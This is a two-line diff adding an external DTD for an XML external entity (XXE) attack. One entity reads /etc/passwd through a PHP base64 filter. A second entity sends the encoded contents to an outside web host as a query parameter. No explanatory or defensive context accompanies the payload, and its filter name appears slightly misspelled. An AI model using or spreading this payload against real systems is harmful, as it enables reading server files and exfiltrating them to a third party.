@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base-64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ordershomedepot.com/?content=%file;'>">
